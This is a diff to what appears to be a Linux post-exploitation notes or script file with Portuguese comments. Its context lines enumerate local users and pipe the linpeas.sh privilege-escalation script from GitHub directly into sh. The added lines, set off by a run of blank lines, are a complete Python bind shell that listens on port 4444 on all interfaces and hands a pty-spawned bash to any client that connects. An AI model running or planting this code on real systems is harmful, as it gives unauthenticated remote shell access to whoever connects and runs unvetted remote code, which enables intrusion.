@@ -126,3 +126,33 @@ getent passwd | awk -F: '{printf "%-20s UID:%s\n",$1,$3}'
 
 #baixa e utiliza limpezas.sh
 curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
+
+
+
+
+
+
+
+#!/usr/bin/env python3
+# bind_shell.py
+import socket, os, pty
+
+HOST = "0.0.0.0"   # escuta em todas as interfaces
+PORT = 4444
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+s.bind((HOST, PORT))
+s.listen(1)
+print(f"[+] Listening on {HOST}:{PORT} ...")
+conn, addr = s.accept()
+print(f"[+] Connection from {addr}")
+
+# dup socket para stdin/out/err e abrir um pty para interatividade
+os.dup2(conn.fileno(), 0)
+os.dup2(conn.fileno(), 1)
+os.dup2(conn.fileno(), 2)
+pty.spawn("/bin/bash")
+
+conn.close()
+s.close()
